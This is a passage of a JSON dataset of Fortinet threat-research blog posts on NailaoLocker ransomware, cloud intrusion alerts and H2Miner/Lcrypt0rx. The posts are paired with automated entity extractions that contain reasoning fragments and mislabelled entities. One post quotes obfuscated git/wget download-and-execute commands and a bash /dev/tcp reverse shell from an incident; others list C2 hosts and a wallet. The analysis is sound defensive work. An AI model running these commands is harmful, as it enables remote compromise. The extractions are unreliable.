[
  {
    "title": "FortiGuard Labs Threat Research",
    "link": "https://www.fortinet.com/blog/threat-research",
    "content": "FortiGuard Labs Threat Research FortiGuard Labs analyzes NailaoLocker ransomware, a unique variant using SM2 encryption and a built-in decryption function. Learn how it works, why it matters, and how Fortinet protects against it. ByKuan-Yen LiuandYen-Ting LeeJuly 18, 2025 FortiGuard Labs Threat Research FortiCNAPP Composite Alerts link weak signals into clear timelines—helping security teams detect cloud-native threats earlier and triage them faster. ByDavid AdamsonJuly 17, 2025 FortiGuard Labs Threat Research FortiCNAPP Labs uncovers Lcrypt0rx, a likely AI-generated ransomware variant used in updated H2Miner campaigns targeting cloud resources for Monero mining. ByAkshat PradhanJuly 16, 2025 FortiGuard Labs Threat Research Discover how FortiSandbox 5.0 detects Dark 101 ransomware, even with sandbox evasion tactics. Learn how advanced behavioral analysis blocks file encryption, system tampering, and ransom note deployment. ByBryan LuJuly 14, 2025 FortiGuard Labs Threat Research Explore how AI is changing the cat-and-mouse dynamic of cybersecurity, from cracking obfuscation and legacy languages to challenging new malware built with Flutter, Rust, and Delphi. ByAxelle ApvrilleJuly 10, 2025 FortiGuard Labs Threat Research FortiGuard Labs explores how NordDragonScan utilizes an effective distribution network for dissemination. Learn more. ByCara LinJuly 07, 2025 FortiGuard Labs Threat Research FortiGuard Labs analyzes RondoDox, a stealthy new botnet targeting TBK DVRs and Four-Faith routers via CVE-2024-3721 and CVE-2024-12856. Learn how it evades detection, establishes persistence, and mimics gaming and VPN traffic to launch DDoS attacks. ByVincent LiJuly 03, 2025 FortiGuard Labs Threat Research Threat actor impersonates Colombian government to deliver DCRAT via phishing email, using obfuscation, steganography, and PowerShell payload chains. ByAriel LitvakJuly 01, 2025 FortiGuard Labs Threat Research Explore a detailed technical analysis of a Havoc Remote Access Trojan (RAT) variant used in a targeted cyberattack against Middle East critical national infrastructure. Learn how Fortinet detects and protects against Havoc-based threats. ByXiaopeng ZhangandJohn SimmonsJune 23, 2025 FortiGuard Labs Threat Research FortiGuard Labs has uncovered an ongoing cyberattack, targeting companies in Taiwan using phishing emails disguised as tax-related communications. Read more. ByPei Han LiaoJune 17, 2025 Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (NailaoLocker, Malware), (SM2 encryption, Technique), (FortiGuard Labs, Organization), (FortiCNAPP, Threat Type), (Lcrypt0rx, Malware), (H2Miner, Threat Type), (Dark 101, Malware), (NordDragonScan, Malware), (RondoDox, Malware), (FortiSandbox 5.0, Tool), (AI, Technique), (Flutter, Language), (Rust, Language), (Delphi, Language), (TBK DVRs, Device), (Four-Fa, Device)\nRelationships: (NailaoLocker, uses, SM2 encryption), (FortiCNAPP, used by, H2Miner), (Lcrypt0rx, used by, H2Miner), (Dark 101, used by, FortiSandbox 5.0), (NordDragonScan, uses, distribution network), (RondoDox, targets, TBK DVRs), (RondoDox, targets, Four-Fa), (AI, challenges, Flutter), (AI, challenges, Rust), (AI, challenges, Delphi)\n```\n\nOkay, let's tackle this. The user provided a text and wants me to identify entities and relationships based on the given types. First, I need to go through the input text carefully.\n\nLooking at the input, the first part",
      "entities": [
        [
          "NailaoLocker",
          "Malware"
        ],
        [
          "SM2 encryption",
          "Technique"
        ],
        [
          "FortiGuard Labs",
          "Organization"
        ],
        [
          "FortiCNAPP",
          "Threat Type"
        ],
        [
          "Lcrypt0rx",
          "Malware"
        ],
        [
          "H2Miner",
          "Threat Type"
        ],
        [
          "Dark 101",
          "Malware"
        ],
        [
          "NordDragonScan",
          "Malware"
        ],
        [
          "RondoDox",
          "Malware"
        ],
        [
          "FortiSandbox 5.0",
          "Tool"
        ],
        [
          "AI",
          "Technique"
        ],
        [
          "Flutter",
          "Language"
        ],
        [
          "Rust",
          "Language"
        ],
        [
          "Delphi",
          "Language"
        ],
        [
          "TBK DVRs",
          "Device"
        ],
        [
          "Four-Fa",
          "Device"
        ]
      ],
      "relationships": [
        [
          "NailaoLocker",
          "uses",
          "SM2 encryption"
        ],
        [
          "FortiCNAPP",
          "used by",
          "H2Miner"
        ],
        [
          "Lcrypt0rx",
          "used by",
          "H2Miner"
        ],
        [
          "Dark 101",
          "used by",
          "FortiSandbox 5.0"
        ],
        [
          "NordDragonScan",
          "uses",
          "distribution network"
        ],
        [
          "RondoDox",
          "targets",
          "TBK DVRs"
        ],
        [
          "RondoDox",
          "targets",
          "Four-Fa"
        ],
        [
          "AI",
          "challenges",
          "Flutter"
        ],
        [
          "AI",
          "challenges",
          "Rust"
        ],
        [
          "AI",
          "challenges",
          "Delphi"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 16,
    "relationship_count": 10,
    "model": "Qwen3 4B",
    "index": 0
  },
  {
    "title": "NailaoLocker Ransomware’s “Cheese”",
    "link": "https://www.fortinet.com/blog/threat-research/nailaolocker-ransomware-cheese",
    "content": "FortiGuard Labs Threat Research Built-In Decryption or Just Another Trap? Affected Platforms: Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Most files on the compromised machines are encryptedSeverity Level:High FortiGuard Labs recently ran across NailaoLocker, a ransomware variant targeting Microsoft Windows systems. Like many ransomware families, it uses AES-256-CBC to encrypt user files. What sets it apart is the presence of hard-coded SM2 cryptographic keys and a built-in decryption function—an uncommon combination that raises immediate questions about intent. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The name “Nailao,” which means “cheese” in Chinese, may be more than a naming quirk. This ransomware could represent a rare opportunity: a payload with embedded recoverability. Or it could be bait—a trap laid to mislead victims and security researchers. One victim’s solution may, in this case, be another’s cheese. In this blog, we examine NailaoLocker’s complete technical profile, including its execution flow, encryption and decryption routines, and use of SM2 cryptography. We assess whether this variant introduces a genuine threat or exposes an exploitable flaw. NailaoLocker is delivered to the target system as a set of three files: Execution begins when the attacker triggers usysdiag.exe, which loads the malicious sensapi.dll using a DLL side-loading technique. This DLL decrypts and loads the actual ransomware payload (usysdiag.exe.dat) directly into memory. To minimize forensic traces, NailaoLoader frees its own library from memory and deletes sensapi.dll immediately after execution. To prevent multiple instances from running simultaneously, NailaoLocker creates a mutex named lockv7. After loading, NailaoLocker checks a hard-coded value against the string \"XXXX\" to determine which mode to activate: encryption or decryption. This variant does not support command-line arguments for mode selection, indicating that the switch is built-in and may be reserved for internal use or testing. Before execution proceeds, the ransomware performs a series of setup tasks. It launches a console window to display real-time status updates, signaling no intent to conceal its activity. It also creates a log file at %ProgramData%\\lock.log, where it records progress throughout the encryption or decryption process. In encryption mode, the ransomware retrieves the ransom note from its own binary using a simple XOR decoding routine. This note is later dropped into the affected directories. To optimize performance, NailaoLocker uses a multi-threaded architecture coordinated through Windows I/O Completion Ports (IOCP). This design enables high-throughput encryption or decryption across multiple processor cores. An I/O Completion Port is initialized by calling CreateIoCompletionPort(). The main thread performs file system traversal and submits target file handles to the IOCP queue. Meanwhile, each worker thread waits for a handle to appear in the queue. When a file is received, the thread proceeds with encryption or decryption as appropriate. This model decouples file discovery from processing, allowing the ransomware to efficiently scale across available CPU resources. The GetSystemInfo() function is invoked to determine the number of logical processors available on the system. Using this information, the ransomware creates at least eight worker threads to handle concurrent file operations. This guarantees a baseline level of parallelism, even on lower-core systems. In the next section, we examine the two distinct execution modes—encryption and decryption—and provide a detailed analysis of their functionality. A distinctive feature of this NailaoLocker variant is its inclusion of a hard-coded SM2 key pair embedded in ASN.1 DER format. These keys are used during both encryption and decryption. As shown in Figure 1, the embedded key structure contains a public key and a private key. The public key, based on elliptic curve cryptography, includes x and y coordinates that define a point on the SM2 curve. The private key—rarely seen in ransomware samples—is also present, suggesting a potential test build or alternate use case. After extraction, the keys are initialized using the OpenSSL function EVP_PKEY_CTX_new(). Mapping from the hard-coded string “SM2”, the numerical identifier is set to 0x494 and is passed to the encryption function. This is further supported by the presence of the expected curve OID—06 08 2A 81 1C CF 55 01 82 2D—within the ASN.1 structure. When running in encryption mode, NailaoLocker performs two primary tasks: identifying target files and encrypting them using AES-256-CBC. It also appends a ransom note to each affected directory. NailaoLocker begins by enumerating all logical drives on the system. It recursively searches accessible directories for files to encrypt, while deliberately skipping specific system paths and file types to avoid destabilizing the infected host. Excluded file extensions: Excluded directories and files: Once a target file is identified, its handle is pushed to the IO Completion Port queue for processing by a worker thread. A ransom note is also dropped into each of the enumerated directories. Each file sent to the I/O Completion Port is processed by a worker thread, which executes the encryption routine using a unique AES key and IV. At the start of each thread, NailaoLocker allocates memory for 38 _OWORD (16-byte) elements. This space is used to store the AES key, IV, their SM2-encrypted versions, and related metadata. The ransomware uses BCryptGenRandom() to generate a 32-byte AES key and a 16-byte IV for each file: These values are used for file encryption with the AES-256-CBC algorithm. Instead of securing the AES key and IV with RSA, as is common in ransomware, NailaoLocker uses SM2, an elliptic curve cryptographic algorithm. This appears to be the first documented case of SM2 being used to protect symmetric file encryption keys in ransomware. Because SM2 does not produce a fixed-length output, the ransomware stores the sizes of the encrypted AES key and IV in two _WORD fields. The full memory layout includes: For each target file, NailaoLocker appends the .locked extension and sets the file attribute to FILE_ATTRIBUTE_HIDDEN. It then reads up to 0x10000 bytes (64 KB) of data per operation. The ransomware performs encryption using the AES-256-CBC algorithm through OpenSSL’s EVP interface. The process includes: The encrypted data replaces the original content. To facilitate decryption, the ransomware assigns a LARGE_INTEGER (8 bytes) to hold the original file size. This value is stored in thefirst 8 bytesof the encrypted file, allowing the decryptor to navigate to the footer containing key material. After the encrypted payload, the ransomware appends a structured footer. It begins with a 4-byte marker 47 56 37 00 (\"LV7\") to indicate the start of the encryption key section. The original file content was shifted to storing the file size. Also, the encryption padding extends the file size. These bytes are not able to fit in the space before the “LV7” flag and are placed after the encrypted AES key and IV. Following the \"LV7\" marker, NailaoLocker stores all remaining cryptographic and overflow data in a fixed sequence. This layout is color-coded in Figure 15: Once encryption is complete, NailaoLocker restores the file’s original last edit timestamp and renames it with the .locked extension (if not already applied). It then prints the total encryption duration to the console in the format done [time], where [time] represents the duration of the encryption operation. In decryption mode, the ransomware requires the SM2 private key to reconstruct the AES key and IV, which are stored at the end of each encrypted file. It then traverses each directory to find encrypted files and performs the decryption process to restore them to their original status. In this section, we will detail the process and validate the correctness of the built-in ASN.1 DER format of the SM2 private key. To initiate decryption mode, we modify the hard-coded value to be the same as \"XXXX,\" prompting the ransomware to switch modes. Upon switching to decryption mode, the file traversal function is adjusted to search for files with the \".locked\" extension, adding them to the IO Completion Port queue for processing. Again, at least eight threads are created to accelerate the decryption process. Each thread begins by parsing the footer of the encrypted file. The ransomware locates the \"LV7\" marker and reads the data that follows: The SM2 private key, extracted earlier from the embedded ASN.1 DER block, is used to decrypt both the AES key and IV. Once the AES key and IV are recovered, the file content is decrypted using AES-256-CBC via OpenSSL’s EVP interface: Unfortunately, in testing, the embedded SM2 private key failed to correctly decrypt the AES key, suggesting the key material may be incomplete or deliberately non-functional. However, FortiGuard analysts confirmed that when the correct AES key and IV are manually supplied—captured during encryption—the decryption function performs as expected and successfully restores the original file contents. This analysis provides a detailed technical profile of NailaoLocker, a ransomware variant notable for its embedded SM2 key pair and built-in decryption function. Although the embedded SM2 private key is non-functional in practice, testing confirms that the decryption logic operates correctly when supplied with valid AES key material, indicating this may be an in-development strain or internal test build. The use of the Chinese SM2 cryptographic standard, particularly to protect AES file encryption keys, marks a notable divergence from conventional ransomware practices. FortiGuard Labs will continue to monitor for the further adoption of region-specific algorithms and for signs that NailaoLocker is evolving toward active deployment. FortiGuard Labs detects the NailaoLocker ransomware samples with the following AV signatures: FortiEDR,FortiXDR, andFortiDeceptorprovide additional protection by detecting anomalous behavior, halting malicious encryption attempts in real time, and diverting ransomware away from production environments. All protections are continuously updated based on real-time intelligence shared across Fortinet’s global sensor network, partner CERTs, and trusted threat intelligence alliances. Fortinet recommends all organizations maintain a strong ransomware defense posture that includes: If you feel your organizations has been impacted by NailaoLocker or any other ransomware, our globalIncident Responseteam can assist with detection, containment, remediation, and recovery. 1248c4b352b9b1325ef97435bd38b2f02d21e2c6d494a2218ee363d9874b760746f3029fcc7e2a12253c0cc65e5c58b5f1296df1e364878b178027ab26562d6860133376a7c8e051da787187761e596ce9b3d0cfcea21ed8f434992aa7cb8605 FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs, Organization), (NailaoLocker, Malware), (AES-256-CBC, Technique), (SM2 cryptographic keys, Technique), (2025 Global Threat Landscape Report, File), (usysdiag.exe, File), (Microsoft Windows, Platform), (Nailao, Name), (cheese, Name), (Ransomware, Threat Type), (FortiGuard Labs Threat Research, File)\nRelationships: (NailaoLocker, uses, AES-256-CBC), (NailaoLocker, uses, SM2 cryptographic keys), (NailaoLocker, uses, usysdiag.exe), (NailaoLocker, is a variant of, Ransomware), (NailaoLocker, is a variant of, Nailao), (NailaoLocker, targets, Microsoft Windows), (NailaoLocker, is associated with, FortiGuard Labs Threat Research), (NailaoLocker, is associated with, 2025 Global Threat Landscape Report), (NailaoLocker, is associated with, FortiGuard Labs)\nOkay, let's break down the input text step by step. The main goal is to identify the entities and their relationships based on the specified types.\n\nFirst, I'll scan the text for any mentions of the entity types. The first sentence mentions \"FortiGuard Labs Threat Research,\" which is an organization, but the user didn",
      "entities": [
        [
          "FortiGuard Labs",
          "Organization"
        ],
        [
          "NailaoLocker",
          "Malware"
        ],
        [
          "AES-256-CBC",
          "Technique"
        ],
        [
          "SM2 cryptographic keys",
          "Technique"
        ],
        [
          "2025 Global Threat Landscape Report",
          "File"
        ],
        [
          "usysdiag.exe",
          "File"
        ],
        [
          "Microsoft Windows",
          "Platform"
        ],
        [
          "Nailao",
          "Name"
        ],
        [
          "cheese",
          "Name"
        ],
        [
          "Ransomware",
          "Threat Type"
        ],
        [
          "FortiGuard Labs Threat Research",
          "File"
        ]
      ],
      "relationships": [
        [
          "NailaoLocker",
          "uses",
          "AES-256-CBC"
        ],
        [
          "NailaoLocker",
          "uses",
          "SM2 cryptographic keys"
        ],
        [
          "NailaoLocker",
          "uses",
          "usysdiag.exe"
        ],
        [
          "NailaoLocker",
          "is a variant of",
          "Ransomware"
        ],
        [
          "NailaoLocker",
          "is a variant of",
          "Nailao"
        ],
        [
          "NailaoLocker",
          "targets",
          "Microsoft Windows"
        ],
        [
          "NailaoLocker",
          "is associated with",
          "FortiGuard Labs Threat Research"
        ],
        [
          "NailaoLocker",
          "is associated with",
          "2025 Global Threat Landscape Report"
        ],
        [
          "NailaoLocker",
          "is associated with",
          "FortiGuard Labs"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 11,
    "relationship_count": 9,
    "model": "Qwen3 4B",
    "index": 1
  },
  {
    "title": "Improving Cloud Intrusion Detection and Triage with FortiCNAPP Composite Alerts",
    "link": "https://www.fortinet.com/blog/threat-research/improving-cloud-intrusion-detection-and-triage-with-forticnapp",
    "content": "FortiGuard Labs Threat Research Detect Cloud Intrusions Faster with Correlated Alerts and Contextual Timelines in FortiCNAPP Moderncyberattacks targeting cloud environmentsare increasingly complex and difficult to detect. Attackers often use multi-stage techniques—such as authentication abuse, privilege escalation, command execution, and interaction withcloud-native APIs—to gain and expand access. Each step in this attack chain often mimics legitimate administrative or developer activity, making it extremely difficult to identify malicious intent. Typical attacker behaviors—such as logging in from a new IP address, accessing previously unused cloud services, or executing command-line processes—can appear indistinguishable from routine actions by developers, admins, or automation. Complicating matters, there is often no single signature, rule, or event that definitively indicates a compromise has occurred. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. As a result, cloud intrusion detection requires examining multiple signals in context. A single weak signal may be inconclusive. But when multiple anomalies involve the same users, resources, or compute nodes over a short period, the likelihood of a targeted intrusion increases significantly. This behavioral correlation is what separates real attacks—or evenpenetration testing—from normal workload activity. FortiCNAPPaddresses this challenge by correlating weak indicators into a coherent picture usingComposite Alertsand theObservation Timeline. The sections below examine how these capabilities work in practice, along with real-world examples that illustrate their value in detecting cloud-native intrusions. To improve detection precision and reduce the burden on security analysts, FortiCNAPP has introduced Composite Alerts. This technology identifies intrusions not by detecting a single event, but by aggregating and correlating multiple indicators associated with the same entity over a defined time window. Each Composite Alert compiles a series of detections, such as suspicious logins, first-time use of administrative APIs, or anomalous container behavior, and links them to specific cloud resources, user identities, or compute instances. Applying a correlation window also allows FortiCNAPP to detect patterns that emerge over minutes or hours rather than the milliseconds of traditional attacks. This approach offers several advantages: As a result, security teams can shift away from reactive alert triage and instead engage in informed, prioritized investigation. By presenting correlated signals with contextual metadata and entity linkage, FortiCNAPP enables analysts to focus their time on evaluating credible threats rather than chasing disconnected anomalies, streamlining the path from detection to resolution. To reduce mean time to triage (MTTT), FortiCNAPP provides each Composite Alert in the form of an Observation Timeline. This timeline serves as both evidence and explanation, enabling the analyst to quickly understand why the alert was generated, which entities were involved, and what sequence of events took place. Each Observation Timeline includes two foundational elements: Once FortiCNAPP has identified a primary entity, such as a compromised IAM user, workload, or compute node, it constructs a timeline by aggregating all related observations for that entity across the alert window. For each observation, the timeline includes: By presenting these elements in a concise, ordered structure, the timeline equips the user to assess the threat in context. This makes it easier to answer key questions, such as: This structured format reduces cognitive load by eliminating the need for analysts to manually reconstruct sequences of activity from disparate logs. It also minimizes investigative overhead by clearly presenting relevant behaviors and their associated metadata in context, enabling faster escalation, more accurate threat classification, and higher-confidence incident response decisions. The first alert involves a machine monitored by a FortiCNAPP agent that was flagged as potentially compromised. Potentially Compromised Host Host machines may have been compromised. The following entities are suspected. Hosts: ip-10-123-45-67 The machine suspected of compromise had the hostname ip-10-123-45-67. Additional host details were available to the end user. The timeline begins on May 13 at 12:00 PM, when FortiCNAPP observed a new vulnerable application installed on the host. Two days later, on May 15 at 10:00 AM, the system launched several new child applications—processes not previously seen originating from this parent process. At 10:36 AM, the timeline flagged a possible reverse shell command. Inspection of the associated command line confirmed it: the host initiated an outbound connection to a remote system, granting that system interactive shell access—even if the machine was behind a firewall or otherwise unreachable from the internet. Further activity that day strengthened the case for compromise. At 12:00 PM, the host contacted a known-bad external domain. At 12:51 PM, it resolved the domain to an internal IP, indicating a successful DNS lookup. By 1:00 PM, it had established an anomalous command-line connection to an external server using wget. This suggests the attacker downloaded and executed malicious code from a remote source. The use of wget with the -qO- flag—which suppresses output and streams the response directly to stdout for execution by a child process—further supports the likelihood of malicious behavior. At this stage, the timeline provides strong evidence of compromise. For further validation, analysts could expand the “+19 more” related entities linked to the “New child application launched” detection. Within this expanded set, multiple command lines reveal obfuscated commands designed to download remote code and execute it locally. This example: /usr/bin/git archive --format=zip --prefix=en --exec=`wget -qO /tmp/QrXErNRt http:// 10.203.118.5:8080/sYdelk;chmod +x /tmp/QrXErNRt;/tmp/QrXErNRt;rm -f /tmp/QrXErNRt` --remote=bOCNVQ/ -- abuses git and wget to download remote code to a file in the tmp directory, execute it, and then clean it up. This example: /usr/bin/git archive --format=zip --prefix=HS --exec=`perl -e 'system(pack(qq,H152,,qq, 62617368202d632027303c263138392d3b65786563203138393c3e2f6465762f7463702f31302e3230332e3131382e352f343434343b7368203c26313839203e2631383920323e2631383927,))'` --remote=dspUKieP/ -- also abuses git, but this time it leverages perl to run an obfuscated script. That obfuscated script, when decoded, is the reverse shell command identified by the syscall detection bash -c 0<&189-;exec 189<>/dev/tcp/ 10.203.118.5/4444;sh <&189 >&189 2>&189 The ability to detect highly obfuscated commands as anomalous and incorporate them into the narrative of a larger suspected attack is a key benefit of FortiCNAPP’s Composite Alerts and of the Observation Timeline feature. This second alert involves AWS identities monitored by FortiCNAPP using CloudTrail logs. Potentially Compromised AWS Keys AWS credentials may have been compromised. The following entities are suspected. Users: AssumedRole/123456789012:AWSReservedSSO_AdministratorAccess_b4a9c2f1837e4d1a; Principal Ids: AROAREDACTEDM9V2Q3LXD:firstname.lastname@redactedcompany.com. In this case, the entity suspected of compromise was the identity AssumedRole/123456789012:AWSReservedSSO_AdministratorAccess_b4a9c2f1837e4d1a, specifically as used by firstname.lastname@redactedcompany.com, as indicated by the principal_id. The timeline began on May 27, when this identity called APIs across 17 AWS regions and 28 different AWS services, suggesting reconnaissance activity. On May 28, the same identity made additional API calls from a previously unseen IP address located outside AWS infrastructure. Over the following two hours, FortiCNAPP observed several additional anomalies associated with this identity, including the use of new services, access to previously used services in new regions, and API calls that resulted in errors. Several of the APIs accessed were sensitive for infrastructure and service discovery. The Lacework customer who received this alert confirmed it as a malicious intrusion. What made this case particularly noteworthy was the absence of an obvious “smoking gun.” Unlike the first example, where reverse shell commands and obfuscated payloads clearly indicated malicious activity, this scenario involved a user behaving anomalously over time in ways that resembled legitimate exploration. The suspicious nature of the behavior became apparent only when the events were viewed in aggregate. FortiCNAPP’s ability to detect this threat did not rely on a single decisive signal. Instead, it resulted from correlating multiple weak signals into a structured timeline. This allowed analysts to determine that a critical mass of suspicious behavior had occurred. This example illustrated the power of Composite Alerts. By aggregating low-signal anomalies that might otherwise be dismissed, FortiCNAPP surfaced a high-fidelity detection—catching the intrusion during the early Discovery phase, before the attacker could escalate privileges or cause damage. Composite Alerts enable security teams to focus on meaningful patterns of behavior that indicate real threats, rather than manually correlating isolated detections. By automatically assembling related signals into a coherent, time-ordered timeline, FortiCNAPP reduces the effort required to identify and respond to cloud-native attacks. Analysts no longer need to reconstruct the narrative from scratch. FortiCNAPP delivers it with supporting evidence and clear entity context. This allows security teams to shift from reactive triage to informed, prioritized investigation. By presenting correlated signals with contextual metadata, FortiCNAPP enables your analysts to focus on credible threats rather than chasing unrelated anomalies. In cloud environments, where attacker dwell times are short and lateral movement can occur quickly, timely and structured detection is essential for containing threats before they escalate into breaches or operational disruptions. FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs Threat Research, Attacker), (Cloud Intrusions, Threat Type), (FortiCNAPP, Tool), (2025 Global Threat Landscape Report, File), (authentication abuse, Technique), (privilege escalation, Technique), (command execution, Technique), (cloud-native APIs, Tool), (attackers, Attacker), (cloud environments, Domain), (FortiCNAPP, Tool), (penetration testing, Technique)\nRelationships: (FortiGuard Labs Threat Research, detects, Cloud Intrusions), (FortiGuard Labs Threat Research, uses, FortiCNAPP), (FortiGuard Labs Threat Research, uses, 2025 Global Threat Landscape Report), (authentication abuse, partOf, Cloud Intrusions), (privilege escalation, partOf, Cloud Intrusions), (command execution, partOf, Cloud Intrusions), (cloud-native APIs, partOf, Cloud Intrusions), (attackers, target, cloud environments), (cloud environments, use, cloud-native APIs), (FortiCNAPP, usedBy, FortiGuard Labs Threat Research), (penetration testing, partOf, Cloud Intrusions)\nOkay, let's tackle this. The input is a text about cloud intrusions and threat detection. First, I need to identify the entities of the specified types.\n\nLooking at the text, \"FortiGuard Labs Threat Research\" is mentioned as the entity doing the detection. The entity type",
      "entities": [
        [
          "FortiGuard Labs Threat Research",
          "Attacker"
        ],
        [
          "Cloud Intrusions",
          "Threat Type"
        ],
        [
          "FortiCNAPP",
          "Tool"
        ],
        [
          "2025 Global Threat Landscape Report",
          "File"
        ],
        [
          "authentication abuse",
          "Technique"
        ],
        [
          "privilege escalation",
          "Technique"
        ],
        [
          "command execution",
          "Technique"
        ],
        [
          "cloud-native APIs",
          "Tool"
        ],
        [
          "attackers",
          "Attacker"
        ],
        [
          "cloud environments",
          "Domain"
        ],
        [
          "FortiCNAPP",
          "Tool"
        ],
        [
          "penetration testing",
          "Technique"
        ]
      ],
      "relationships": [
        [
          "FortiGuard Labs Threat Research",
          "detects",
          "Cloud Intrusions"
        ],
        [
          "FortiGuard Labs Threat Research",
          "uses",
          "FortiCNAPP"
        ],
        [
          "FortiGuard Labs Threat Research",
          "uses",
          "2025 Global Threat Landscape Report"
        ],
        [
          "authentication abuse",
          "partOf",
          "Cloud Intrusions"
        ],
        [
          "privilege escalation",
          "partOf",
          "Cloud Intrusions"
        ],
        [
          "command execution",
          "partOf",
          "Cloud Intrusions"
        ],
        [
          "cloud-native APIs",
          "partOf",
          "Cloud Intrusions"
        ],
        [
          "attackers",
          "target",
          "cloud environments"
        ],
        [
          "cloud environments",
          "use",
          "cloud-native APIs"
        ],
        [
          "FortiCNAPP",
          "usedBy",
          "FortiGuard Labs Threat Research"
        ],
        [
          "penetration testing",
          "partOf",
          "Cloud Intrusions"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 12,
    "relationship_count": 11,
    "model": "Qwen3 4B",
    "index": 2
  },
  {
    "title": "Old Miner, New Tricks",
    "link": "https://www.fortinet.com/blog/threat-research/old-miner-new-tricks",
    "content": "FortiGuard Labs Threat Research H2miner Resurfaces with Lcrypt0rx Ransomware Affected Platforms:Linux, Windows, ContainersImpacted Users:Any OrganizationImpact:Data Encrypted for Impact, Compute Hijacking, Defacement, Sensitive data stolen.Severity Level:Critical The FortiCNAPP team, part of FortiGuard Labs, recently investigated a cluster of virtual private servers (VPS) used for Monero mining. The identified samples are associated withprior H2miner campaignsthat we documented in 2020 and have since been updated with new configurations. H2Miner is a Crypto mining botnet that has been active since late 2019. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. We also identified a new variant of the Lcryx ransomware, calledLcrypt0rx. Lcryx is a relatively new VBScript-based ransomware strain first observed in November 2024. This family exhibits several unusual characteristics that suggest it may have been generated using AI. This is the first documented instance of operational overlap between H2miner and Lcryx, suggesting the following possibilities: The infrastructure hosts a diverse set of samples, including several commercial tools that target multiple operating systems to maximize financial gain from a victim’s environment. Tool Linux Windows Containers KinSing ✔️ Xmrig miners ✔️ ✔️ ✔️ Lcrypt0rx ✔️ Lumma stealer ✔️ DCRat ✔️ Cobalt Strike ✔️ Amadey ✔️ RustyStealer ✔️ ScreenConnect ✔️ The infrastructure uses multiple VPS providers for hosting and Command & Control. 78[.]153[.]140[.]66 HostGlobal plus VPS 80[.]64[.]16[.]241 LIR limited ISP 89[.]208[.]104[.]175 Aeza international VPS 47[.]97[.]113[.]36 Cobalt Strike server hosted by Hangzhou Alibaba Advertising Co. ISP Bitbucket[.]org Used to host payload in repo sadsafsadfsadf/dsfgdsgssdfgdsg 176[.]65[.]137[.]203 Dolphin host VPS. 185[.]156[.]72[.]96 Amadey C2 server hosted by TOV VAIZ PARTNER. ISP 80[.]64[.]18[.]161 Stimul LLC. 207[.]231[.]109[.]252 HostRush VPS. s10[.]krakenfiles[.]com File hosting used for downloading Lcrypt0rx’s wallpaper. This was uploaded on 30-04-2025 104[.]21[.]32[.]1 / softwareshop[.]win Metasploit C2. We suspect the Lcryx family was generated using AI based on the following indicators: We’ve observed growing adoption of large language models (LLMs) by threat actors in recent years. Combined with the widespread availability of commercial tools, this trend has significantly lowered the barrier to entry for cybercriminal activity. In this next section, we will examine some interesting aspects of the identified samples. H2Miner continues to rely heavily on scripts to disable defenses and expand access, ultimately enabling the deployment of miners. Many of these scripts resemble previously documented variants; however, this version has been updated with new deployment URLs. This script includes code blocks that are structurally similar to earlier H2Miner samples used to terminate security software. However, this variant goes further by also targeting database and user application processes. Additionally, it deploysKinsing malware, establishes persistence by registering itself as a service, and attempts to eliminate competing miners by terminating related processes and clearing associated cron entries. The script then checks for an existing cron entry that downloads and executes itself from 80[.]64[.]16[.]241, and adds the entry if it’s missing. Finally, it clears both the current and persistent shell command history to cover its tracks. This script closely resembles earlier H2Miner scripts used to terminate processes and deploy Kinsing malware, but it includes updated URLs. Notably, the script targets theAlibaba Cloud Security Center agentas well as processes andcontainer images running within Docker, indicating an awareness of cloud-specific defenses and containerized environments. This script functions as aKinsing updater. It removes any existing Kinsing installation and redeploys it by downloading and executing a shell script similar in structure to ce.sh. Several additional scripts identified during this investigation reuse code blocks from ce.sh, spr.sh, and cpr.sh. While their specific logic may vary, their ultimate purpose remains consistent: deployingKinsing, a remote access trojan (RAT) commonly used to deliver crypto miners in compromised environments. Name Md5 Description curl-amd64 dbc9125192bd1994cbb764f577ba5dda Kinsing RAT linked to 2021 Log4j (CVE-2021-44228) campaigns kinsing b3039abf2ad5202f4a9363b418002351 Kinsing RAT linked to Openfire (CVE-2023-32315) attacks in 2023. kinsing_aarch64 da753ebcfe793614129fc11890acedbc Kinsing Sample used in Apache ActiveMQ (CVE-2023-46604) attacks in 2023. libsystem.so ccef46c7edf9131ccffc47bd69eb743b Kinsing rootkit observed in the wild in late 2020. This PowerShell script downloads anXMRig Monero minerfrom 78[.]153[.]140[.]66 and saves it to the system’s temporary directory as sysupdate. It then creates a scheduled task using schtasks with the name\"Update service for Windows Service\"to ensure persistence. The script’s structure closely resembles those used in early 2021 mining campaigns and appears to have been reused for current operations. Notably, this XMRig miner is also deployed by theLcrypt0rx ransomwarevariant. The associated configuration file (ff1706b37fea16d75b739a5396d9ffba) points to theMonero wallet:4ASk4RhUyLL7sxE9cPyBiXb82ofekJg2SKiv4MKtCbzwHHLQxVVfVr4D4xhQHyyMTieSM5VUFGR9jZVR5gp6sa1Q2p8SahC This wallet has been previously linked to H2Miner campaigns dating back to late 2021, indicating continuity or overlap in its operator. This usage of older scripts and samples with updated configurations and hosting URLs points to a resurgence of older campaigns from2020and2021. Analysis of this sample shows that it follows the following step-by-step process: Lcrypt0rx first checks if it is running with administrator privileges. If not, it relaunches itself with elevated rights using Shell.Application to invoke wscript.exe with the /elevated flag. Once elevated, the script disables a range of system utilities and user protections by modifying the Windows Registry. These include: It also disables the execution of several critical tools: Lcrypt0rx then attempts to establish persistence by adding its full path to theWinlogon Shellregistry key and registering itself as anImage File Execution Options (IFEO)debugger for cmd.exe. However, these attempts fail because the script path is addedwithout prependingwscript.exe, rendering the entries non-functional. Using WMI, the script then 